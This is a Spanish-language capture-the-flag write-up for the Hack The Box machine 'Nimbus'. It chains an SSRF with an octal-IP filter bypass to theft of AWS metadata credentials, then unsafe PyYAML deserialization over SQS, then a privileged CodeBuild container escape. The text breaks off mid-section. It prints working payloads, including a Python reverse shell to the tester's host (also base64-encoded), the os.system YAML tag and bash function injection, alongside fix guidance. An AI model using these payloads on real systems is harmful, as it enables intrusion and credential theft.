# Writeup: Nimbus (Hack The Box — Difícil)

Nimbus es una máquina **Difícil** de Hack The Box que simula un entorno híbrido **cloud-on-prem**: una aplicación web interna de **Nimbus Labs Engineering** para envío de jobs programados, respaldada por una infraestructura AWS emulada localmente con **Floci** (clon de LocalStack), servicios SQS, S3 y CodeBuild. La cadena de compromiso comienza con una **SSRF** en el endpoint de previsualización de jobs (`/jobs/preview`), que permite alcanzar el **endpoint de metadata de AWS** en `169.254.169.254` y exfiltrar **credenciales temporales del rol `nimbus-web-role`**. Con ellas se accede a la cola SQS `nimbus-jobs`, cuyo consumidor usa `yaml.load` sobre el cuerpo del mensaje: una **deserialización insegura de YAML** que se explota para obtener **ejecución de comandos como `worker`** en un contenedor. El usuario `worker` expone en sus variables de entorno **credenciales AKIA permanentes** que, aunque limitadas, permiten **CodeBuild** en Floci. Se crea un proyecto con un **buildspec controlado** que se ejecuta en un contenedor **privilegiado**, y se abusa de **`/proc/sys/kernel/modprobe`** para ejecutar código en los **namespaces del host como root**, añadiendo una clave SSH al `/root/.ssh/authorized_keys` y obteniendo acceso como **root**.

---

## Fase 1: Reconocimiento

Escaneo de puertos completo:

```bash
sudo nmap -sS --min-rate 500 -p- -n -Pn -vv 10.129.203.220 -oG allPorts
```

**Resultado (extracto):**

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Escaneo de servicios y versiones:

```bash
nmap -sCV -p 22,80 10.129.203.220 -oN targeted
```

**Resultado:**

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
```

**Observaciones clave:**

- **SSH** en el puerto 22 con OpenSSH 9.6p1 sobre Ubuntu.
- **HTTP** en el puerto 80 con nginx, **redirigiendo a `nimbus.htb`** → necesario añadir entrada en `/etc/hosts`.

```bash
echo "10.129.203.220 nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts
```

---

## Fase 2: Enumeración web — Nimbus y sus endpoints

Al acceder a `http://nimbus.htb/` se muestra la página principal de **Nimbus**, un planificador interno de jobs. La página describe el servicio: ejecuta jobs programados y bajo demanda en una flota de workers, usados para backups, ETL, generación de informes y tareas fuera del path de peticiones. Indica también que los jobs se envían como YAML a través de un Git interno o pegando el YAML directamente en el submitter, y que el acceso SSH a los workers requiere aprobación de un DevOps lead. En la parte inferior aparece un enlace **`healthcheck`**.

Al pulsar sobre **`healthcheck`** se accede a la API de estado:

```bash
curl -s http://nimbus.htb/api/v1/health | jq
```

**Resultado:**

```json
{
  "services": {
    "queue":     { "endpoint": "http://aws.nimbus.htb", "status": "ok" },
    "scheduler": { "endpoint": "http://aws.nimbus.htb", "status": "ok" },
    "storage":   { "endpoint": "http://aws.nimbus.htb", "status": "ok" }
  },
  "status": "healthy",
  "version": "1.4.2"
}
```

El endpoint revela un **nuevo subdominio** `aws.nimbus.htb`, que devuelve un error XML de tipo **STS** (Security Token Service) de AWS:

```bash
curl -s http://aws.nimbus.htb/
```

```xml
<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>InvalidClientTokenId</Code>
    <Message>The security token included in the request is invalid.</Message>
  </Error>
  <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>
</ErrorResponse>
```

**Hallazgo:** `aws.nimbus.htb` es un **endpoint AWS emulado** (Floci / LocalStack). El servicio responde como STS, lo que sugiere que el resto de servicios AWS (SQS, S3, CodeBuild, etc.) son accesibles a través del mismo host virtual.

El endpoint `/login` está temporalmente deshabilitado. El mensaje indica que el SSO se está migrando a Okta y que, durante la ventana de migración, **el job submitter no requiere autenticación**. El acceso SSH sigue funcionando para shell en los workers, previa aprobación de la clave por un DevOps lead.

**Hallazgo:** durante la migración SSO, el **job submitter no requiere autenticación**, lo que convierte a `/jobs` y `/jobs/preview` en superficie pública.

---

## Fase 3: Funcionalidad de preview de jobs y confirmación del stack

El endpoint `/jobs` acepta jobs en **dos modalidades**: subir el YAML directamente o cargarlo desde una URL. La primera prueba se realizó enviando un YAML de ejemplo con `yaml_body`:

```http
POST /jobs/preview HTTP/1.1
Host: nimbus.htb
Content-Type: application/x-www-form-urlencoded

yaml_body=%23+Configuraci%C3%B3n+de+la+aplicaci%C3%B3n%0D%0Aapp%3A%0D%0A...
```

**Respuesta (extracto):**

```html
<div class="ok">✓ Parsed successfully. Job would be submitted to queue <strong>nimbus-jobs</strong> in region <strong>us-east-1</strong>, picked up by workers running <strong>nimbus/worker</strong>.</div>
<div class="panel">
  <h3>Submitted YAML</h3><pre>...YAML original...</pre>
  <h3>Parsed</h3><pre>{'app': {'nombre': 'MiAplicacion', 'version': '1.0.0', 'debug': True}, ...}</pre>
</div>
```

La respuesta revela tres datos clave:

- La cola destino es **`nimbus-jobs`**.
- La región es **`us-east-1`**.
- El consumidor corre la imagen **`nimbus/worker`**.

La segunda modalidad, `url=`, indica que el servidor **descarga el YAML desde una URL arbitraria**. Lo verificamos con un servidor HTTP local:

```bash
nano test.yaml
python3 -m http.server
```

```http
POST /jobs/preview HTTP/1.1
Host: nimbus.htb
Content-Type: application/x-www-form-urlencoded

url=http%3A%2F%2F10.10.15.18%3a8000%2Ftest.yaml
```

**Respuesta:** el servidor web local registró la petición:

```
10.129.203.220 - - [14/Nov/2026 16:47:43] "GET /test.yaml HTTP/1.1" 200 -
```

Y en la respuesta HTML apareció el panel con `Fetched: http://10.10.15.18:8000/test.yaml · HTTP 200`, junto con el contenido y su parseo.

Para determinar el stack del backend, interceptamos la petición con `nc`:

```bash
nc -lnvp 80
```

```http
GET /test.yml HTTP/1.1
Host: 10.10.15.18
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

**Hallazgo:** el backend usa **`python-requests`**, confirmando un servidor **Python**. Esta información es relevante para la explotación posterior de deserialización.

---

## Fase 4: SSRF en la carga de jobs por URL

La funcionalidad de fetch por URL permite alcanzar recursos internos. El objetivo clásico es el **endpoint de metadata de instancia de AWS** en `169.254.169.254`, que devuelve credenciales temporales del rol IAM asignado a la instancia.

### 4.1 Primer filtro: extensión del archivo

```http
POST /jobs/preview HTTP/1.1
Host: nimbus.htb
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169
```

**Respuesta:**

```html
<div class="panel err"><strong>Error:</strong> URL must point to a YAML file (must end in .yaml or .yml)</div>
```

El servidor exige que la URL termine en `.yaml` o `.yml`.

### 4.2 Bypass del primer filtro: query string

En muchas validaciones, la extensión se comprueba sobre el **path** y no sobre la query string. Añadimos `?test.yml` como query:

```http
url=http://169.254.169/?test.yml
```

**Respuesta:**

```html
<div class="panel err"><strong>Error:</strong> Security policy: this URL targets an internal resource and has been blocked.</div>
```

El primer filtro fue **evadido** (la comprobación de extensión pasa), pero aparece un **segundo filtro** que detecta IPs privadas y reservadas (`169.254.x.x`, `10.x.x.x`, etc.).

### 4.3 Bypass del segundo filtro: representación octal

El bloqueo se realiza probablemente mediante una lista negra de IPs o rangos. Una técnica clásica es usar representaciones alternativas de la IP que, **al ser parseadas por la librería HTTP**, resuelven a la IP real, pero que **no coinciden con las cadenas de la lista negra**:

- `169` en decimal = `0251` en octal
- `254` en decimal = `0376` en octal

Por tanto, `0251.0376.0251.0376` es funcionalmente `169.254.169.254`:

```http
url=http://0251.0376.0251.0376/?test.yml
```

**Respuesta:**

```html
<div class="meta">Fetched: <code>http://0251.0376.0251.0376/?test.yml</code> · HTTP 200</div>
<h3>Raw response</h3><pre>latest</pre>
<h3>Parsed</h3><pre>latest</pre>
</div>
```

**Hallazgo:** el servidor ha alcanzado el endpoint de metadata (`latest` es la primera línea de `/latest/meta-data/`). Ambas protecciones han sido evadidas.

### 4.4 Extracción de credenciales IAM

Enumeramos el rol IAM asignado a la instancia:

```http
url=http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?test.yml
```

**Respuesta:**

```json
{
  "Code": "Success",
  "LastUpdated": "2026-11-14T22:53:34Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM",
  "Expiration": "2026-11-15T04:53:34Z"
}
```

**Análisis del resultado:**

- **`ASIA...`** indica credenciales **temporales** de un rol asumido (las credenciales permanentes de un usuario IAM comienzan por `AKIA`).
- El campo `Token` es el **session token** obligatorio para usar estas credenciales.
- La expiración (`Expiration`) marca la vida útil de las credenciales (habitualmente 1 hora, renovable por el rol).

---

## Fase 5: Credenciales temporales de AWS y reconocimiento de la cola

Configuramos las credenciales con un perfil dedicado:

```bash
aws configure --profile nimbus-user
```

```
AWS Access Key ID [None]: ASIAQX4PG7L2K9M3N5R8
AWS Secret Access Key [None]: bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs
AWS Session Token [None]: IQoJb3JpZ2luX2VjEHQa...
Default region name [None]: us-east-1
Default output format [None]: json
```

Verificamos la identidad asociada:

```bash
aws sts get-caller-identity --profile nimbus-user --endpoint-url http://aws.nimbus.htb
```

**Resultado:**

```json
{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
```

**Análisis:** el ARN confirma que las credenciales pertenecen a la **rol `nimbus-web-role`**, asumida por la instancia `i-0a1b2c3d4e5f6789a` (la instancia que ejecuta la aplicación web). El prefijo `AROA` del `UserId` indica un **rol asumido**.

Enumeramos las colas SQS:

```bash
aws sqs list-queues --profile nimbus-user --endpoint-url http://aws.nimbus.htb
```

```json
{
    "QueueUrls": [
        "http://floci:4566/847219365028/nimbus-jobs"
    ]
}
```

Consultamos sus atributos:

```bash
aws sqs get-queue-attributes --queue-url http://floci:4566/847219365028/nimbus-jobs --profile nimbus-user --endpoint-url http://aws.nimbus.htb
```

```json
{
    "Attributes": {
        "DelaySeconds": "0",
        "MessageRetentionPeriod": "345600",
        "MaximumMessageSize": "262144",
        "VisibilityTimeout": "30",
        "QueueArn": "arn:aws:sqs:us-east-1:847219365028:nimbus-jobs",
        "CreatedTimestamp": "1794690152",
        "LastModifiedTimestamp": "1794690152",
        "ApproximateNumberOfMessages": "0",
        "ApproximateNumberOfMessagesNotVisible": "0"
    }
}
```

La URL de la cola revela el hostname del emulador AWS: **`floci:4566`**. El puerto 4566 es el puerto por defecto de **LocalStack** y sus derivados (Floci).

Intentamos consumir mensajes de la cola:

```bash
aws sqs receive-message --queue-url http://floci:4566/847219365028/nimbus-jobs --profile nimbus-user --endpoint-url http://aws.nimbus.htb
```

**Resultado:**

```xml
<ErrorResponse ...>
  <Error>
    <Type>Sender</Type>
    <Code>AccessDenied</Code>
    <Message>User: arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a is not authorized to perform: sqs:ReceiveMessage on resource: nimbus-jobs</Message>
  </Error>
</ErrorResponse>
```

**Hallazgo:** el rol `nimbus-web-role` **no tiene permiso para leer** de la cola, pero **sí para enviar** (comprobado en la siguiente fase). El worker que consume la cola usa credenciales con permisos de lectura (AKIA, descubiertas en la Fase 7).

---

## Fase 6: Deserialización insegura de YAML → shell como `worker`

### 6.1 Confirmación del vector

Los mensajes en la cola SQS son procesados por el worker. Si el worker deserializa el cuerpo con `yaml.load` **sin `SafeLoader`**, es vulnerable a **deserialización insegura de YAML**, que permite instanciar objetos arbitrarios de Python mediante etiquetas `!!python/object/apply:`. El payload de la colección **PayloadsAllTheThings** sirve como prueba de concepto:

```bash
aws sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body '!!python/object/apply:os.system ["ping -c 4 10.10.15.18"]' \
  --profile nimbus-user --endpoint-url http://aws.nimbus.htb
```

**Resultado:**

```json
{
    "MD5OfMessageBody": "fdaa45eb6e60657d9cc02b90a49a54e0",
    "MessageId": "acd251f1-eaeb-4650-9755-1f7d21a73e12"
}
```

Capturamos ICMP para verificar la ejecución:

```bash
sudo tcpdump icmp -n -i tun0
```

```
18:55:59.302509 IP 10.129.203.220 > 10.10.15.18: ICMP echo request, id 1, seq 1, length 64
18:55:59.306103 IP 10.10.15.18 > 10.129.203.220: ICMP echo reply, id 1, seq 1, length 64
18:56:00.563366 IP 10.129.203.220 > 10.10.15.18: ICMP echo request, id 1, seq 2, length 64
...
```

**Hallazgo:** el worker deserializa el YAML con `yaml.Loader`, lo que permite ejecutar código Python arbitrario en el contenedor.

### 6.2 Reverse shell

Preparamos el payload en base64 para evitar problemas de caracteres especiales:

```bash
cat shell
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.18",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

base64 -w0 shell
aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE1LjE4Iiw0NDMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyAK
```

Inyectamos el payload como comando a ejecutar por `os.system`:

```bash
aws sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body '!!python/object/apply:os.system ["echo aW1wb3J0...IHNoIiwiLWkiXSk7IA== | base64 -d | python3" ]' \
  --profile nimbus-user --endpoint-url http://aws.nimbus.htb
```

Escuchamos en el puerto 443:

```bash
nc -nlvp 443
```

**Resultado:**

```
connect to [10.10.15.18] from (UNKNOWN) [10.129.245.218] 33226
/bin/sh: 0: can't access tty; job control turned off
$ whoami
worker
```

**Hallazgo:** shell como **`worker`** en el contenedor consumidor de la cola.

---

## Fase 7: Shell como `worker` y análisis en profundidad del código vulnerable

### 7.1 Código vulnerable del worker

```bash
worker@9fd10032c0b9:/app$ cat worker.py
```

```python
"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""
import os, time, subprocess, boto3, yaml

ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/000000000000/nimbus-jobs")
REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
POLL_SECS = 5

sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)

def handle_message(body):
    job = yaml.load(body, Loader=yaml.Loader)  # vulnerable
    ...
    script = job.get("script", "")
    if script:
        result = subprocess.run(["python3", "-c", script], ...)
```

### 7.2 Análisis en profundidad del código vulnerable

El cuerpo del mensaje SQS (`body`) es **controlado por el atacante** (recordemos que el rol `nimbus-web-role` tenía permiso `sqs:SendMessage` sobre la cola `nimbus-jobs`). La llamada a `yaml.load` con `Loader=yaml.Loader` procesa ese YAML **antes de que el worker extraiga el campo `script`**, lo que significa que cualquier efecto secundario del parseo se ejecuta **en el momento de la deserialización**, no cuando se procesa el job.

`yaml.Loader` es el **cargador completamente permisivo** de PyYAML: no se limita a construir tipos primitivos (strings, listas, diccionarios), sino que **resuelve etiquetas YAML específicas de Python** que instancian objetos y llaman a funciones arbitrarias. La documentación de PyYAML y las guías de seguridad lo describen como equivalente a `eval()` sobre datos no confiables.

La causa raíz es de **diseño**, no un bug puntual: el formato YAML 1.1 incluye etiquetas que mapean directamente al modelo de objetos del lenguaje anfitrión. PyYAML las implementó fielmente en su loader completo, de modo que *"reconstruir un objeto"* y *"ejecutar código arbitrario"* son la misma operación desde la perspectiva del intérprete.

### 7.3 Mecánica interna del tag `!!python/object/apply`

YAML permite etiquetas (`tags`) que indican al parser cómo interpretar un valor. Además de las estándar (`!!str`, `!!int`, etc.), PyYAML implementa etiquetas específicas de Python:

- `!!python/object/apply:<callable> [args]`
- `!!python/object/new:<class>`
- `!!python/module:<module>`

La etiqueta `!!python/object/apply:os.system ["id"]` le dice al cargador: *"importa el módulo `os`, resuelve el atributo `system` y llámalo con el argumento `"id"`"*.

El flujo que sigue PyYAML es:

1. **Tokenización** del YAML → se detecta el tag `!!python/object/apply`.
2. **Resolución del tag**: el `Loader` busca una función constructora registrada para ese tag. En `yaml.Loader` (y en `yaml.UnsafeLoader`) existe un constructor que **importa dinámicamente el módulo** (`os`) y **obtiene la referencia al callable** (`os.system`).
3. **Invocación**: el constructor llama al callable con los argumentos proporcionados en la lista (`["ping -c 4 10.10.15.18"]`).
4. **Ejecución**: `os.system` ejecuta el comando en el sistema operativo del worker.

El punto crítico es que la ejecución ocurre **durante la fase de parseo**, antes de que el worker inspeccione el diccionario resultante. Por eso el payload `!!python/object/apply:os.system [...]` funciona incluso si el worker luego comprueba `isinstance(job, dict)` y descarta el mensaje: el comando ya se ha ejecutado.

### 7.4 Contexto de CVE: por qué `yaml.Loader` es peligroso

`yaml.Loader` (y su alias histórico `yaml.UnsafeLoader`) es el cargador original de PyYAML. Durante años fue el comportamiento **por defecto** de `yaml.load()`, lo que dio lugar a la **CVE-2017-18342** (CVSS 9.8): cualquier aplicación que parseara YAML no confiable con `yaml.load()` sin especificar un loader seguro quedaba expuesta a ejecución remota de código.

A partir de PyYAML 5.1, `yaml.load()` empezó a emitir un warning si no se especificaba `Loader=`, y en 6.0 el argumento pasó a ser obligatorio. Sin embargo, **pasar explícitamente `Loader=yaml.Loader` sigue siendo inseguro**: la advertencia solo evita el uso accidental del loader peligroso, pero si el desarrollador lo elige de forma consciente, el riesgo persiste.

En el caso de Nimbus, el desarrollador del worker eligió deliberadamente `Loader=yaml.Loader`. Un `yaml.safe_load(body)` habría bloqueado el payload: `SafeLoader` **solo construye escalares, listas y diccionarios**, y ante un tag `!!python/object/apply` lanza una excepción en lugar de invocar el callable.

### 7.5 Contramedidas a nivel de código

1. **Usar `yaml.safe_load` (o `yaml.load` con `Loader=yaml.SafeLoader`)**  
   `safe_load` restringe la deserialización a tipos primitivos y **rechaza cualquier tag `!!python/*`**. Es la corrección de una línea que elimina toda la superficie de ejecución de código.

2. **Nunca parsear YAML de fuentes no confiables con loaders permisivos**  
   `yaml.Loader`, `yaml.UnsafeLoader` e incluso `yaml.FullLoader` (históricamente explotable, CVE-2020-14343) no son adecuados para datos que provienen de la red, colas, webhooks o entradas de usuario.

3. **Validar el esquema después del parseo**  
   Incluso con `safe_load`, el YAML puede contener estructuras inesperadas. Validar el diccionario resultante contra un esquema (Pydantic, JSON Schema, etc.) antes de usar sus campos evita sorpresas.

4. **Aislar el proceso de parseo**  
   Si por requisitos funcionales se necesita un loader completo (raro en producción), ejecutar el parseo en un **sandbox** o en un proceso con privilegios mínimos, nunca en el mismo proceso que tiene acceso a credenciales o al socket de la cola.

### 7.6 Variables de entorno

```bash
worker@9fd10032c0b9:/app$ env
```

```env
AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
AWS_ENDPOINT_URL=http://aws.nimbus.htb
QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
AWS_DEFAULT_REGION=us-east-1
HOME=/home/worker
PWD=/app
```

**Hallazgo:** las credenciales del worker son **`AKIA` (permanentes)**, no `ASIA`. Estas credenciales tienen acceso de lectura a la cola SQS (lo que explica por qué el rol `nimbus-web-role` no podía leer).

### 7.7 Topología de red

```bash
worker@9fd10032c0b9:/app$ cat /etc/hosts
```

```
127.0.0.1       localhost
::1             localhost ip6-localhost ip6-loopback
172.18.0.1      nimbus.htb
172.18.0.1      aws.nimbus.htb
172.18.0.3      9fd10032c0b9
```

**Hallazgo:** el contenedor está en la red Docker `172.18.0.0/16`. `172.18.0.1` es el gateway del bridge (el host). `172.18.0.3` es el propio contenedor. La URL de la cola apunta a `floci:4566`, que resolvemos a continuación:

```bash
worker@9fd10032c0b9:/app$ ping floci
PING floci (172.18.0.2) 56(84) bytes of data.
64 bytes from nimbus-floci.nimbus-net (172.18.0.2): icmp_seq=1 ttl=64 time=0.056 ms
```

**Hallazgo:** `floci` está en `172.18.0.2`, hostname `nimbus-floci.nimbus-net` (red Docker `nimbus-net`).

---

## Fase 8: Reconocimiento del entorno Floci (AWS emulado)

### 8.1 Escaneo de puertos desde el contenedor

Para determinar qué servicios expone `floci`, escribimos un escáner de puertos en Python (no hay `nmap` ni `wget` en el contenedor):

```python
worker@9fd10032c0b9:/app$ cat > escaner.py
#!/usr/bin/env python3
import socket
from concurrent.futures import ThreadPoolExecutor
import sys

TARGET_IP = "172.18.0.2"
START_PORT = 1
END_PORT = 65535
MAX_THREADS = 200

def scan_port(port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            result = s.connect_ex((TARGET_IP, port))
            if result == 0:
                print(f"[+] Puerto {port} ABIERTO")
    except Exception:
        pass

def main():
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for port in range(START_PORT, END_PORT + 1):
            executor.submit(scan_port, port)

if __name__ == "__main__":
    main()
```

```bash
worker@9fd10032c0b9:/app$ python3 escaner.py
[*] Iniciando escaneo de puertos en 172.18.0.2...
[+] Puerto 4566 ABIERTO
[+] Puerto 9169 ABIERTO
```

**Hallazgo:** `floci` expone dos puertos:

- **4566**: puerto estándar de **LocalStack/Floci** (API unificada de todos los servicios AWS).
- **9169**: puerto adicional (probablemente UI o servicio auxiliar).

### 8.2 Enumeración de servicios AWS

`http://floci:4566` responde como API de S3:

```bash
worker@9fd10032c0b9:/app$ curl http://floci:4566
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListAllMyBucketsResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Owner><ID>owner</ID><DisplayName>owner</DisplayName></Owner>
  <Buckets>
    <Bucket>
      <Name>nimbus-dev-artifacts</Name>
      <CreationDate>2026-11-16T20:39:23.692039869Z</CreationDate>
    </Bucket>
  </Buckets>
</ListAllMyBucketsResult>
```

El healthcheck de Floci revela el **conjunto completo de servicios emulados**:

```bash
worker@9fd10032c0b9:/app$ curl http://floci:4566/_floci/health | python3 -m json.tool
```

**Resultado (extracto):**

```json
{
    "edition": "community",
    "services": {
        "sqs": "running",
        "s3": "running",
        "dynamodb": "running",
        "lambda": "running",
        "apigateway": "running",
        "iam": "running",
        "kafka": "running",
        "rds": "running",
        "secretsmanager": "running",
        "codebuild": "running",
        "ec2": "running",
        "ecs": "running",
        "ecr": "running",
        ...
    },
    "version": "1.5.17",
    "original_edition": "floci-always-free"
}
```

**Hallazgo:** Floci emula **más de 50 servicios AWS**, incluyendo **CodeBuild**, **IAM**, **Secrets Manager**, **EC2**, **ECS**, **ECR**, **KMS**, **Lambda**, **RDS**, **DynamoDB**, entre otros. Con el catálogo en mano, evaluamos varias rutas de ejecución de código. Servicios como **Lambda**, uno de los candidatos iniciales, requerían permisos IAM que nuestras credenciales no tenían. Tras probar otros servicios, determinamos que **CodeBuild** era la ruta correcta: permitía ejecutar un `buildspec.yml` arbitrario en un contenedor gestionado por el servicio.

---

## Fase 9: AWS CodeBuild y ejecución de buildspec controlado

### 9.1 ¿Qué es CodeBuild?

**AWS CodeBuild** es un servicio gestionado de compilación que ejecuta un archivo **`buildspec.yml`** en un contenedor efímero. Cada build se ejecuta en un contenedor Docker que el servicio crea, aprovisiona y destruye. El contenedor recibe el entorno y los comandos definidos en el buildspec. Si el proyecto se configura con `privilegedMode: true`, el contenedor obtiene **todas las capabilities de Linux** (incluyendo `CAP_SYS_ADMIN`) y acceso a los dispositivos del host.

### 9.2 Reconocimiento inicial

Listamos proyectos existentes:

```bash
worker@9fd10032c0b9:/app$ aws --endpoint-url http://floci:4566 codebuild list-projects
```

```json
{ "projects": [] }
```

No hay proyectos. Creamos el primero. El buildspec más simple (`id`) sirve para verificar el funcionamiento del servicio:

```yaml
name: pwn
source:
  type: NO_SOURCE
  buildspec: |
    version: 0.2
    phases:
      build:
        commands:
          - id
artifacts:
  type: NO_ARTIFACTS
environment:
  type: LINUX_CONTAINER
  image: floci/floci:latest
  computeType: BUILD_GENERAL1_SMALL
  privilegedMode: true
serviceRole: arn:aws:iam::847219365028:role/service-role/codebuild
```

Creamos el proyecto:

```bash
worker@9fd10032c0b9:/app$ aws --endpoint-url http://floci:4566 codebuild create-project --cli-input-yaml file:///tmp/c.yml
```

```json
{
    "project": {
        "name": "pwn",
        "arn": "arn:aws:codebuild:us-east-1:847219365028:project/pwn",
        ...
        "environment": {
            "type": "LINUX_CONTAINER",
            "image": "floci/floci:latest",
            "computeType": "BUILD_GENERAL1_SMALL",
            "privilegedMode": true
        },
        ...
    }
}
```

Lanzamos el build y consultamos su estado:

```bash
aws --endpoint-url http://floci:4566 codebuild start-build --project-name pwn
aws --endpoint-url http://floci:4566 codebuild batch-get-builds --ids pwn:1
```

**Resultado (extracto):**

```json
{
    "currentPhase": "COMPLETED",
    "buildStatus": "FAILED",
    "phases": [
        ...
        {
            "phaseType": "BUILD",
            "phaseStatus": "FAILED",
            "contexts": [
                {
                    "statusCode": "COMMAND_EXECUTION_ERROR",
                    "message": "Exit code 128: OCI runtime exec failed: exec failed: cannot exec in a stopped container"
                }
            ]
        }
    ]
}
```

**Hallazgo:** el build falla con **`cannot exec in a stopped container`**. El contenedor de compilación se detuvo antes de ejecutar el comando. Es un comportamiento particular de Floci — el contenedor no permanece activo el tiempo suficiente para ejecutar el comando del buildspec.

### 9.3 Confirmación de control con `BASH_FUNC_id%%`

Para verificar que podemos **inyectar código en el contenedor** a través de variables de entorno, creamos un segundo proyecto con una variable **`BASH_FUNC_id%%`** que redefine la función `id` de bash. Cuando el buildspec ejecuta `id`, bash ejecuta la función (no el binario), demostrando control sobre la ejecución:

```yaml
name: pwn2
source:
  type: NO_SOURCE
  buildspec: |
    version: 0.2
    phases:
      build:
        commands:
          - id
artifacts:
  type: NO_ARTIFACTS
environment:
  type: LINUX_CONTAINER
  image: floci/floci:latest
  computeType: BUILD_GENERAL1_SMALL
  privilegedMode: true
  environmentVariables:
    - name: "BASH_FUNC_id%%"
      value: '() { echo "uid=1000(worker) gid=1000(worker) groups=1000(worker)"; }'
      type: PLAINTEXT
serviceRole: arn:aws:iam::847219365028:role/service-role/codebuild
```

Creamos el proyecto, lo lanzamos y consultamos:

```bash
aws --endpoint-url http://floci:4566 codebuild create-project --cli-input-yaml file:///tmp/c.yml
aws --endpoint-url http://floci:4566 codebuild start-build --project-name pwn2
aws --endpoint-url http://floci:4566 codebuild batch-get-builds --ids pwn2:1
```

**Resultado (extracto):**

```json
{
    "currentPhase": "COMPLETED",
    "buildStatus": "SUCCEEDED",
    "environment": {
        "environmentVariables": [
            {
                "name": "BASH_FUNC_id%%",
                "value": "() { echo \"uid=1000(worker) gid=1000(worker) groups=1000(worker)\"; }",
                "type": "PLAINTEXT"
            }
        ],
        "privilegedMode": true
    }
}
```

**Hallazgo:** el build **SUCCEEDED**. Esto confirma que:

1. El contenedor de CodeBuild se ejecuta con **`privilegedMode: true`**.
2. Podemos **inyectar variables de entorno** que afectan a la ejecución del buildspec.
3. Podemos **inyectar funciones bash** mediante `BASH_FUNC_*%%` (mecanismo de bash para exportar funciones a subprocesos vía variables de entorno).

---

## Fase 10: Escape del contenedor privilegiado vía `modprobe`

### 10.1 Contexto técnico: contenedor privilegiado y `CAP_SYS_ADMIN`

Cuando un contenedor Docker se ejecuta con `privileged: true`, el runtime le otorga **todas las capabilities de Linux**, incluyendo:

- **`CAP_SYS_ADMIN`**: capacidades administrativas (montar filesystems, modificar `/proc/sys/*`, etc.).
- **`CAP_NET_ADMIN`**: manipulación de red.
- **`CAP_DAC_READ_SEARCH`**, **`CAP_SETUID`**, etc.

En particular, `CAP_SYS_ADMIN` permite **escribir en `/proc/sys/kernel/*`**, algo que en un contenedor no privilegiado está bloqueado (read-only). Este es el vector que permite el escape.

### 10.2 Estructura del `overlayfs`

El filesystem raíz del contenedor está montado como **`overlay`**, con la estructura habitual de capas:

- **`lowerdir`**: capas base de solo lectura (la imagen).
- **`upperdir`**: capa de escritura donde van los cambios del contenedor.
- **`workdir`**: directorio de trabajo interno del overlay.
- **merged** (`/`): vista unificada de todas las capas.

Cualquier archivo **creado o modificado** dentro del contenedor termina físicamente en **`upperdir`**, que **reside en el host** (en `/var/lib/containerd/...`). Desde el propio contenedor, el path a `upperdir` es visible leyendo `/proc/mounts`:

```bash
